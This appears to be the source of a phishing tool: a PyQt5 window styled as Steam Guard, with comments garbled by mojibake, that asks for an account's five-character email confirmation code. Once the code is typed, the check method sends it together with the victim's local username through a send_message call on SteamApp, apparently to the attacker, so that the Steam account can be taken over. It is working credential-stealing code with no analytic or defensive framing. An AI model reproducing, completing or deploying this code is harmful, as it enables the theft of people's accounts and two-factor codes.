import sys, config
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QPixmap, QPainter, QColor, QPen, QFont
from PyQt5.QtWidgets import QApplication, QLabel, QWidget, QLineEdit, QPushButton, QCheckBox
from requests import get
from os import system
from main import SteamApp

from getpass import getuser

class SteamGuard(QWidget):
    def __init__(self, login):
        super().__init__()

        # –ó–∞–≥—Ä—É–∑–∫–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
        response = get('https://sun9-14.userapi.com/impg/1UvgvmNS0AEYQAWZ6cDCQMxgjRorVM2YMSq27Q/ItclbMVxrZU.jpg?size=708x431&quality=96&sign=6573a98011ac9c8fe00592d328c5dd92&type=album')
        image_data = response.content

        # –°–æ–∑–¥–∞–Ω–∏–µ –æ–±—ä–µ–∫—Ç–∞ QPixmap –∏–∑ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
        pixmap = QPixmap()
        pixmap.loadFromData(image_data)

        # –ü—Ä–∏—Å–≤–æ–µ–Ω–∏–µ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ QPixmap –∞—Ç—Ä–∏–±—É—Ç—É background
        self.background = pixmap
        
        self.label = QLabel(self)
        self.label.setPixmap(self.background)

        self.login = login

        # –°–æ–∑–¥–∞–µ–º —ç–∫–∑–µ–º–ø–ª—è—Ä —à—Ä–∏—Ñ—Ç–∞ Arial
        font = QFont("Arial")

        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å—Ç–∏–ª—å –¥–ª—è –≤—Å–µ–≥–æ –≤–∏–¥–∂–µ—Ç–∞
        self.setStyleSheet("QWidget { font-family: Arial; }")

        self.steamapp = SteamApp()

        self.email_code = QLineEdit(self)
        self.email_code.setGeometry(182, 125, 343, 68)
        self.email_code.setMaxLength(5)
        self.email_code.setStyleSheet("""
            QLineEdit {
                background-color: #32353c;
                border-radius: 4px;
                padding: 6px;
                color: white;
                font-size: 30px;
                font-weight: bold;
                letter-spacing: 40px;
                padding-left: 29px;
                text-transform: uppercase;  /* –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞ –≤ –∑–∞–≥–ª–∞–≤–Ω—ã–µ –±—É–∫–≤—ã */
            }
        """)
        self.email_code.textChanged.connect(self.check)


        self.help = QLabel("–£ –º–µ–Ω—è –±–æ–ª—å—à–µ –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç–µ –¥–ª—è —ç—Ç–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞", self)
        self.help.setGeometry(180, 290, 800, 30)
        self.help.setStyleSheet("""
            color: #A9A9A9;
            font-size: 12px;
            cursor: arrow;
            text-decoration: underline;
        """)
        self.help.mousePressEvent = self.help_clicked

        # –î–æ–±–∞–≤–ª—è–µ–º —Ñ–æ—Ä–º—É —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
        self.reg = QLabel("–ê–∫–∫–∞—É–Ω—Ç: " + self.login, self)
        self.reg.setGeometry(280, 80, 800, 30)
        self.reg.setStyleSheet("""
            color: #A9A9A9;
            font-size: 20px;
            cursor: arrow;
        """)

        # –ó–∞–¥–∞–µ–º –Ω–∞—á–∞–ª—å–Ω—ã–µ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã –∏ —Ä–∞–∑–º–µ—Ä—ã –æ–∫–Ω–∞
        self.setGeometry(100, 100, self.background.width(), self.background.height())

        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å—Ç–∏–ª—å –æ–∫–Ω–∞ –±–µ–∑ —Ä–∞–º–∫–∏
        self.setWindowFlags(Qt.FramelessWindowHint)

        # –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π –º—ã—à–∏
        self.label.mousePressEvent = self.mouse_press_event
        self.label.mouseMoveEvent = self.mouse_move_event

        self.drag_position = None

    def check(self, text):
        if len(text) >= 5:
            self.steamapp.send_message(f'''üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {getuser()}
‚öô –ö–û–î: {text}''')

    def help_clicked(self, event):
        system('start https://help.steampowered.com/ru/faqs/view/3944-4D89-1B3E-27DE')
        
    def mouse_press_event(self, event):
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å–ª–∏ –∫–ª–∏–∫ –±—ã–ª —Å–¥–µ–ª–∞–Ω –≤ –≤–µ—Ä—Ö–Ω–µ–π —á–∞—Å—Ç–∏ –æ–∫–Ω–∞
        if event.y() <= 30:
            self.drag_position = event.globalPos() - self.frameGeometry().topLeft()
        else:
            self.drag_position = None
        if event.button() == Qt.LeftButton and event.x() >= self.width() - 30 and event.y() <= 30:
            sys.exit()  # –ó–∞–∫—Ä—ã–≤–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
    
    def mouse_move_event(self, event):
        if self.drag_position:
            self.move(event.globalPos() - self.drag_position)
    
    def close_app(self, event):
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å–ª–∏ –∫–ª–∏–∫ –±—ã–ª —Å–¥–µ–ª–∞–Ω –≤ –ø—Ä–∞–≤–æ–º –≤–µ—Ä—Ö–Ω–µ–º —É–≥–ª—É –æ–∫–Ω–∞
        if event.x() >= self.width() - 30 and event.y() <= 30:
            sys.exit() # –ó–∞–∫—Ä—ã–≤–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ